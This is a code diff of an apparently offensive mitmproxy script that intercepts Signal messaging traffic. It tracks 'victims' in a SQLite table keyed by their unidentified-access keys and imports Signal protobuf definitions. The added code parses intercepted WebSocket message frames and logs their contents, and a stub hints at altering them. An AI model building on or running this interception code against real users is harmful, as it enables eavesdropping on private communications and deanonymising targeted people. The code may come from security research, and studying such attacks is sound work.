@@ -7,6 +7,12 @@ import sqlite3
 from setup import setup_db
 import base64
 import re
+from proto_python.wire_pb2 import *
+from proto_python.SignalService_pb2 import *
+from proto_python.storage_pb2 import *
+from proto_python.WebSocketResources_pb2 import *
+from proto_python import *
+from test_protocol import *
 
 
 def try_run_sudo(cmd):
@@ -218,12 +224,12 @@ def response(flow: http.HTTPFlow):
         ctx.log.alert(type(target))
         if target is None or target == "":
             bearer = flow.request.headers.get("Unidentified-Access-Key", None)
-            ctx.log.alert(bearer)
+            #ctx.log.alert(bearer)
             res = cur.execute(
                 "SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,)
             )
             target = res.fetchone()[0]
-            ctx.log(f"target : {target!r}")
+            #ctx.log(f"target : {target!r}")
 
         for device in info["devices"]:
             # ctx.log(params)
@@ -266,10 +272,20 @@ def websocket_message(flow: http.HTTPFlow):
     for messages in cont:
         ctx.log(messages.content)
         pattern = b"/v1/messages"
+        proto_msg = WebSocketMessage()
 
         if pattern in messages.content:
             ctx.log.alert("you found it")
-            pass
+            proto_msg.ParseFromString(messages.content)
+            ctx.log.alert(proto_msg.request.body)
+            message = json.loads(proto_msg.request.body)
+            ctx.log.warn(message)
+            
+            ##### Protocol Run?
+            
+            message["content"]
+
+            
 
 
 #        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
